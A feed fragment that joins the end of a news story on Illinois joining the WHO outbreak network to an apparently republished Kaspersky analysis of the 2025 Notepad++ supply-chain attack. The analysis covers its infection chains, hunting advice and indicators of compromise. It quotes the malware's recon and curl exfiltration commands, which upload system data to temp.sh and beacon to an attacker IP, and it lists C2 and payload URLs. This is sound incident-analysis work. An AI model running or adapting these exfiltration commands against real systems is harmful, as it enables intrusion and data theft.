<p>The network monitors disease outbreaks across the globe and prepares countries to respond to those outbreaks. As a member, Illinois will have access to research, timely alerts and information about outbreaks, risk assessments and trainings so state officials can respond to public health emergencies.</p>
<p>The move follows President Donald Trump leaving the international health organization in January 2025.​</p>
<p>“By withdrawing from the World Health Organization, Donald Trump has undermined science and weakened our nation’s ability to detect and respond to global health threats,” Pritzker said in a news release. “I refuse to sit idly by and let that happen.”</p>
<p>Many WHO meetings involve national governments around the world, but <a href="https://goarn.who.int/about" target="_blank" rel="noopener">GOARN</a> is open to a wider variety of groups. It connects hundreds of public institutions, laboratories, academic institutions and different levels of government to detect and respond to public health threats like COVID-19, influenza and other diseases.</p>
<p>“Membership in this network strengthens Illinois’ preparedness for future pandemics and emerging threats,” the release states.</p>
<p>Illinois will bring laboratory capacity to the organization, including genomic sequencing and wastewater surveillance developed for COVID-19. Illinois also provides expertise in outbreak investigations and communication about risk.</p>
<p>Already, the Illinois Department of Public Health collects data and information about emerging health risks, and that will continue.</p>
<p>“Disease knows no borders,” said Dr. Sameer Vohra, director of IDPH. “The decision by the U.S. government to withdraw from the World Health Organization threatens decades of progress in global health coordination that makes Illinois residents safer.”</p>
<p>Joining GOARN is another move Pritzker has made to counter federal public health policies.</p>
<p>Pritzker in 2025 <a href="https://capitolnewsillinois.com/news/pritzker-signs-bill-allowing-illinois-to-issue-state-specific-vaccine-guidelines/" target="_blank" rel="noopener">signed a bill</a> to allow IDPH to set its own vaccine guidelines. It also requires insurance companies to cover vaccines that are recommended by IDPH.</p>
<p>He also <a href="https://gov-pritzker-newsroom.prezly.com/gov-pritzker-joins-launch-of-governors-public-health-alliance-to-protect-illinoisians-from-trumps-attack-on-science" target="_blank" rel="noopener">joined the Governors Public Health Alliance</a>, a group of 15 other governors that coordinates to monitor public health threats, share information and communicate with the global health community.</p>
<p>California <a href="https://www.npr.org/2026/01/28/g-s1-107526/california-world-health-organization-infectious-diseases" target="_blank" rel="noopener">also joined GOARN</a> in late January.</p>
<p>The <a href="https://www.npr.org/2026/01/20/g-s1-106126/trump-world-health-organization-withdrawal" target="_blank" rel="noopener">withdrawal is complicated</a> because there is no official way to leave WHO and the United States is the only country with the ability to do so. Experts say it’s up to WHO members when the departure is finalized, and they expect the matter to come up in meetings in February and May.</p>
<p>Leaving WHO doesn’t mean leaving all global health efforts. The U.S. will still participate in organizations like UNICEF and the United Nations Children’s Fund.</p>
<p>Trump tried in 2020 to leave WHO, but President Joe Biden reversed that decision. Trump has accused WHO of not being independent and has demanded reforms without clarifying what those are. He has also criticized the way WHO handled the COVID-19 pandemic.</p>
<p>Tom Hughes, executive director of the Illinois Public Health Association, praised the announcement, emphasizing how strong systems and partnerships are crucial to public health.</p>
<p>“Public health works best when we are informed, connected, and prepared,” he said. “Joining GOARN means Illinois public health leaders can access timely, reliable information, global expertise, and trusted partners when it matters most.”</p>
<p><a href="https://capitolnewsillinois.com/" target="_blank" rel="noopener"><em>Capitol News Illinois</em></a><em> is a nonprofit, nonpartisan news service that distributes state government coverage to hundreds of news outlets statewide. It is funded primarily by the Illinois Press Foundation and the Robert R. McCormick Foundation.</em></p>
								
								
																	
															</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Notepad++ supply chain attack breakdown (355 pts)]]></title>
            <link>https://securelist.com/notepad-supply-chain-attack/118708/</link>
            <guid>46878338</guid>
            <pubDate>Tue, 03 Feb 2026 22:35:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://securelist.com/notepad-supply-chain-attack/118708/">https://securelist.com/notepad-supply-chain-attack/118708/</a>, See on <a href="https://news.ycombinator.com/item?id=46878338">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
													<h2 id="introduction">Introduction</h2>
<p>On February 2, 2026, the developers of Notepad++, a text editor popular among developers, <a href="https://notepad-plus-plus.org/news/hijacked-incident-info-update/" target="_blank">published a statement</a> claiming that the update infrastructure of Notepad++ has been compromised. According to the statement, this was due to a hosting provider level incident, which occurred from June to September 2025. However, attackers were able to retain access to internal services until December 2025.</p>
<h2 id="multiple-execution-chains-and-payloads">Multiple execution chains and payloads</h2>
<p>Having checked our telemetry related to this incident, we have been amazed to find out how different and unique were the execution chains used in this supply chain attack. We identified that over the course of four months, from July to October 2025, attackers who have compromised Notepad++ have been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads.</p>
<p>We observed three different infection chains overall designed to attack about a dozen machines, belonging to:</p>
<ul>
<li>Individuals located in Vietnam, El Salvador and Australia;</li>
<li>A government organization located in the Philippines;</li>
<li>A financial organization located in El Salvador;</li>
<li>An IT service provider organization located in Vietnam.</li>
</ul>
<p>Despite the variety of payloads observed, Kaspersky solutions have been able to block the identified attacks as they occurred.</p>
<p>In this article, we describe the variety of the infection chains we observed in the Notepad++ supply chain attack, as well as provide numerous previously unpublished IoCs related to it. </p>
<h3 id="chain-1-late-july-and-early-august-2025">Chain #1 — late July and early August 2025</h3>
<p>We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025. It was hosted at http://45.76.155[.]202/update/update.exe. Notably, the first scan  of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan.</p>
<p>The <code>update.exe</code> file downloaded from this URL (SHA1: 8e6e505438c21f3d281e1cc257abdbf7223b7f5a) was launched by the legitimate Notepad++ updater process, <code>GUP.exe</code>. This file turned out to be a NSIS installer, of about 1 MB in size. When started, it sends a heartbeat containing system information to the attackers. This is done through the following steps:</p>
<ol>
<li>The file creates a directory named <code>%appdata%\ProShow</code> and sets it as the current directory;</li>
<li>It executes the shell command <code>cmd /c whoami&amp;&amp;tasklist &gt; 1.txt</code>, thus creating a file with the shell command execution results in the <code>%appdata%\ProShow</code> directory;</li>
<li>Then it uploads the <code>1.txt</code> file to the temp[.]sh hosting service by executing the <code>curl.exe -F "file=@1.txt" -s https://temp.sh/upload</code> command;</li>
<li>Next, it sends the URL to the uploaded <code>1.txt</code> file by using the <code>curl.exe --user-agent "https://temp.sh/ZMRKV/1.txt" -s http://45.76.155[.]202</code> shell command. As can be observed, the uploaded file URL is transferred inside the user agent.</li>
</ol>
<p>Notably, the same behavior of malicious Notepad++ updates, specifically the launch of shell commands and the use of the temp[.]sh website for file uploading, <a href="https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh/3" target="_blank">has been described  on the Notepad++ community forums</a> by a user named soft-parsley.<br>
<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png" alt="" width="2048" height="783" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png 2048w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-300x115.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-1024x392.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-768x294.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-1536x587.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-915x350.png 915w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-740x283.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-732x280.png 732w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-800x306.png 800w" sizes="auto, (max-width: 2048px) 100vw, 2048px"></a><br>
After sending system information, the <code>update.exe</code> file executes the second-stage payload. To do that, it performs the following actions: </p>
<ul>
<li>Drops the following files to the <code>%appdata%\ProShow</code> directory:
<ul>
<li><code>ProShow.exe</code> (SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)</li>
<li><code>defscr</code> (SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)</li>
<li><code>if.dnt</code> (SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)</li>
<li><code>proshow.crs</code> (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)</li>
<li><code>proshow.phd</code> (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)</li>
<li><code>proshow_e.bmp</code> (SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)</li>
<li><code>load</code> (SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)</li>
</ul>
</li>
<li>Executes the dropped <code>ProShow.exe</code> file.</li>
</ul>
<p>The launched <code>ProShow.exe</code> file is a legitimate ProShow software, which is abused to launch a malicious payload. Normally, when threat actors aim to execute a malicious payload inside a legitimate process, they resort to the DLL sideloading technique. However, this time attackers have decided to avoid using it — likely due to how much attention this technique receives nowadays. Instead, they abused an old, known vulnerability in the ProShow software, which dates back to early 2010s. The dropped file named <code>load</code> contains an exploit payload, which is launched when the <code>ProShow.exe</code> file is launched. It is worth noting that, apart from this payload, all files in the <code>%appdata%\ProShow</code> directory are legitimate.</p>
<p>Analysis of the exploit payload revealed that it contains two shellcodes — one at the very start and the other one in the middle of the file. The shellcode located at the start of the file contains a set of meaningless instructions and is not designed to be executed — rather, attackers used it as the exploit padding bytes. It is likely that, by using a fake shellcode for padding bytes instead of something else (e.g., a sequence of <code>0x41</code> characters or random bytes), attackers aimed to confuse researchers and automated analysis systems. </p>
<p>The second shellcode, which is stored in the middle of the file, is the one that is launched when <code>ProShow.exe</code> is started. It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it. </p>
<p>The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server. For instance, it uses the GET request URL https://45.77.31[.]210/api/update/v1 and the POST request URL https://45.77.31[.]210/api/FileUpload/submit.</p>
<p>Later on, in early August 2025, we have observed attackers to use the same download URL for the <code>update.exe</code> files (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates. However, we noted the following differences:</p>
<ul>
<li>In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;</li>
<li>The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit.</li>
</ul>
<p>We have not further seen any infections leveraging chain #1 after early August 2025.</p>
<h3 id="chain-2-middle-and-end-of-september-2025">Chain #2 — middle and end of September 2025</h3>
<p>A month and a half after malicious update detections ceased, we observed attackers to resume deploying these updates in the middle of September 2025, using another infection chain. The malicious update was still being distributed from the http://45.76.155[.]202/update/update.exe URL, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well. However, its file size was now about 140 KB. Again, this file performed two actions:</p>
<ul>
<li>Obtained system information by executing a shell command and uploading its execution results to temp[.]sh;</li>
<li>Dropped a next-stage payload on disk and launched it.</li>
</ul>
<p>Regarding system information, attackers made the following changes to how it was collected:</p>
<ul>
<li>They changed the working directory to %APPDATA%\Adobe\Scripts;</li>
<li>They started collecting more system information details, changing the executed shell command to <code>cmd /c "whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano" &gt; a.txt</code>.</li>
</ul>
<p>The created <code>a.txt</code> file was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header.</p>
<p>As for the next-stage payload, it has been changed completely. The NSIS installer was configured to drop the following files to the %APPDATA%\Adobe\Scripts directory:</p>
<ul>
<li><code>alien.dll</code> (SHA1: 6444dab57d93ce987c22da66b3706d5d7fc226da);</li>
<li><code>lua5.1.dll</code> (SHA1: 2ab0758dda4e71aee6f4c8e4c0265a796518f07d);</li>
<li><code>script.exe</code> (SHA1: bf996a709835c0c16cce1015e6d44fc95e08a38a);</li>
<li><code>alien.ini</code> (SHA1: ca4b6fe0c69472cd3d63b212eb805b7f65710d33).</li>
</ul>
<p>Next, it executes the following shell command to launch the script.exe file: <code>%APPDATA%\%Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini</code>.</p>
<p>All of the files in the <code>%APPDATA%\Adobe\Scripts</code> directory, except for <code>alien.ini</code>, are legitimate and related to the Lua interpreter. As such, the previously mentioned command is used by attackers to launch a compiled Lua script, located in the <code>alien.ini</code> file.  Below is a screenshot of its decompilation:<br>
<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png" alt="" width="560" height="291" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png 560w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2-300x156.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2-539x280.png 539w" sizes="auto, (max-width: 560px) 100vw, 560px"></a><br>
As we can see, this small script is used for placing shellcode inside executable memory and then launching it through the <code>EnumWindowStationsW</code> API function.</p>
<p>The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the https://cdncheck.it[.]com/users/admin URL.</p>
<p>The Cobalt Strike payload contains the C2 server URLs that slightly differ from the ones seen previously: https://cdncheck.it[.]com/api/getInfo/v1 and https://cdncheck.it[.]com/api/FileUpload/submit.</p>
<p>Attacks involving chain #2 continued until the end of September, when we observed two more malicious <code>update.exe</code> files. One of them had the SHA1 hash 13179c8f19fbf3d8473c49983a199e6cb4f318f0. The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected. Specifically, attackers split the single shell command they used for this (<code>cmd /c "whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano" &gt; a.txt</code>) into multiple commands:</p>
<ul>
<li><code>cmd /c whoami &gt;&gt; a.txt</code></li>
<li><code>cmd /c tasklist &gt;&gt; a.txt</code></li>
<li><code>cmd /c systeminfo &gt;&gt; a.txt</code></li>
<li><code>cmd /c netstat -ano &gt;&gt; a.txt</code></li>
</ul>
<p>Notably, the same sequence of commands has been previously documented by the soft-parsley user on the Notepad++ community forums.</p>
<p>The other <code>update.exe</code> file had the SHA1 hash 4c9aac447bf732acc97992290aa7a187b967ee2c. Using it, attackers performed the following:</p>
<ul>
<li>Changed the system information upload URL to https://self-dns.it[.]com/list;</li>
<li>Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;</li>
<li>Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;</li>
<li>Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query.</li>
</ul>
<h3 id="chain-3-october-2025">Chain #3 — October 2025</h3>
<p>In early October 2025, attackers changed the infection chain once again. They have as well changed the C2 server for distributing malicious updates, with the observed update URL being http://45.32.144[.]255/update/update.exe. The payload downloaded (SHA1: d7ffd7b588880cf61b603346a3557e7cce648c93) was still a NSIS installer, however, unlike in the case of chains 1 and 2, this installer did not include the system information sending functionality. It simply dropped the following files to the <code>%appdata%\Bluetooth\</code> directory:</p>
<ul>
<li><code>BluetoothService.exe</code>, a legitimate executable (SHA1: 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed);</li>
<li><code>log.dll</code>, a malicious DLL (SHA1: f7910d943a013eede24ac89d6388c1b98f8b3717);</li>
<li><code>BluetoothService</code>, an encrypted shellcode (SHA1: 7e0790226ea461bcc9ecd4be3c315ace41e1c122).</li>
</ul>
<p>This execution chain relies on the sideloading of the <code>log.dll</code> file, which is responsible for launching the encrypted <code>BluetoothService</code> shellcode into the <code>BluetoothService.exe</code> process. Notably, such execution chains are commonly used by Chinese-speaking threat actors. This particular execution chain <a href="https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/" target="_blank">has already been described by Rapid7</a>, and the final payload observed in it is the custom Chrysalis backdoor. </p>
<p>Unlike the previous chains, chain #3 does not load a Cobalt Strike Beacon directly. However, in their article Rapid7 claim that they additionally observed a Cobalt Strike Beacon payload being deployed to the <code>C:\ProgramData\USOShared</code> folder, while conducting incident response on one of the machines infected with the Notepad++ supply chain attack. Whilst Rapid7 does not detail how this file was dropped to the victim machine, we can highlight the following similarities between that Beacon payload and the Beacon payloads observed in chains #1 and #2:</p>
<ol>
<li>In both cases, Beacons are loaded through a Metasploit downloader shellcode, with similar URLs used (api.wiresguard.com/users/admin for the Rapid7 payload, cdncheck.it.com/users/admin and http://45.77.31[.]210/users/admin for chain #1 and chain #2 payloads);</li>
<li>The Beacon configurations are encrypted with the XOR key <code>CRAZY</code>;</li>
<li>Similar C2 server URLs are used for Cobalt Strike Beacon communications (i.e. api.wiresguard.com/api/FileUpload/submit for the Rapid7 payload and https://45.77.31[.]210/api/FileUpload/submit for the chain #1 payload).</li>
</ol>
<h3 id="return-of-chain-2-and-changes-in-urls-october-2025">Return of chain #2 and changes in URLs — October 2025</h3>
<p>In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe. Still, this payload used the previously mentioned self-dns.it[.]com  and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications.</p>
<p>Further in late October 2025, we observed attackers to start changing URLs used for malicious update deliveries. Specifically, attackers started using the following URLs:</p>
<ul>
<li>http://95.179.213[.]0/update/install.exe;</li>
<li>http://95.179.213[.]0/update/update.exe;</li>
<li>http://95.179.213[.]0/update/AutoUpdater.exe.</li>
</ul>
<p>We haven’t observed any new payloads deployed from these URLs — they involved usage of both #2 and #3 execution chains. Finally, we have not seen any payloads being deployed starting from November 2025.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Notepad++ is a text editor used by numerous developers. As such, the ability to control update servers of this software gave attackers a unique possibility to break into machines of high-profile organizations around the world. The attackers made an effort to avoid losing access to this infection vector — they were spreading the malicious implants in a targeted manner, and they were skilled enough to drastically change the infection chains about once a month. Whilst we identified three distinct infection chains during our investigation, we would not be surprised to see more of them in use. To sum up our findings, here is the overall timeline of the infection chains that we identified:<br>
<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png" alt="" width="2578" height="659" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png 2578w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-300x77.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1024x262.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-768x196.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1536x392.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-2048x523.png 2048w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1370x350.png 1370w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-740x189.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1096x280.png 1096w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-800x204.png 800w" sizes="auto, (max-width: 2578px) 100vw, 2578px"></a><br>
The variety of infection chains makes detection of the Notepad++ supply chain attack quite a difficult and at the same time creative task. We would like to propose the following methods, from generic to specific, to hunt down traces of this attack:</p>
<ul>
<li>Check systems for deployments of NSIS installers, which have been used in all three observed execution chains. For example, this can be done by looking for logs related to creations of the <code>%localappdata%\Temp\ns.tmp</code> directory, made by NSIS installers at runtime. Make sure to investigate the origins of each identified NSIS installer to avoid false positives;</li>
<li>Check network traffic logs for DNS resolutions of the temp[.]sh domain, which is unusual to observe in corporate environments. Also, it is beneficial to conduct a check for raw HTTP traffic requests that have a temp[.]sh URL embedded in the user agent — both these steps will make it possible to detect chain #1 and chain #2 deployments;</li>
<li>Check systems for launches of malicious shell commands referenced in the article, such as <code>whoami</code>, <code>tasklist</code>, <code>systeminfo</code> and <code>netstat -ano</code>;</li>
<li>Use specific IoCs listed below to identify known malicious domains and files.</li>
</ul>
<h2 id="indicators-of-compromise">Indicators of compromise</h2>
<p>URLs used for malicious Notepad++ update deployments<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.76.155.202%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_42031260d3146adf&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.76.155[.]202/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.32.144.255%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_f6e6bd04c7eb3fc0&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.32.144[.]255/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_4127a336aa8cfcf3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2finstall.exe/?icid=gl_sl_post-opentip_sm-team_39007ebfc73652d8&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/install.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2fautoupdater.exe/?icid=gl_sl_post-opentip_sm-team_55921a0acdd3aea5&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/AutoUpdater.exe</a></p>
<p>System information upload URLs<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.76.155.202%2flist/?icid=gl_sl_post-opentip_sm-team_f9995f5431a638c6&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.76.155[.]202/list</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fself-dns.it.com%2flist/?icid=gl_sl_post-opentip_sm-team_be7fc69a991908fe&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://self-dns.it[.]com/list</a></p>
<p>URLs used by Metasploit downloaders to deploy Cobalt Strike beacons<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fusers%2fadmin/?icid=gl_sl_post-opentip_sm-team_f0c164ff6f9fd0c5&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/users/admin</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fusers%2fadmin/?icid=gl_sl_post-opentip_sm-team_907a305f6f4d4462&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/users/admin</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fhelp%2fget-start/?icid=gl_sl_post-opentip_sm-team_011c47a252117f96&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/help/Get-Start</a></p>
<p>URLs used by Cobalt Strike Beacons delivered by malicious Notepad++ updaters<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fapi%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_b23e939d98d1f956&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/api/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_7d59bb41bdeb156b&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/api/FileUpload/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_32630cecf516a406&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fmetadata%2fsubmit/?icid=gl_sl_post-opentip_sm-team_9df337d2774186bb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/Metadata/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fgetinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_dcd0af6bb34cfed4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/getInfo/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_7f4b5ffe6e26cb80&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/FileUpload/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fresolve/?icid=gl_sl_post-opentip_sm-team_845673fe6ab5d8c3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/resolve</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fdns-query/?icid=gl_sl_post-opentip_sm-team_94921446150c8e8a&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/dns-query</a></p>
<p>URLs used by the Chrysalis backdoor and the Cobalt Strike Beacon payloads associated with it, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.skycloudcenter.com%2fa%2fchat%2fs%2f70521ddf-a2ef-4adf-9cf0-6d8e24aaa821/?icid=gl_sl_post-opentip_sm-team_9ce93d8d92430d74&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.skycloudcenter[.]com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_586b734d80b6d984&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_2b9f8ccf1ce1d4eb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/api/FileUpload/submit</a></p>
<p>URLs related to Cobalt Strike Beacons uploaded to multiscanners, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fuffhxpsy/?icid=gl_sl_post-opentip_sm-team_3fd03c8eefed275e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/uffhxpSy</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fapi%2fgetbasicinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_9daab5fed98b43ea&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/api/getBasicInfo/v1</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fapi%2fmetadata%2fsubmit/?icid=gl_sl_post-opentip_sm-team_30d3646339ec7f6e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/api/Metadata/submit</a><br>
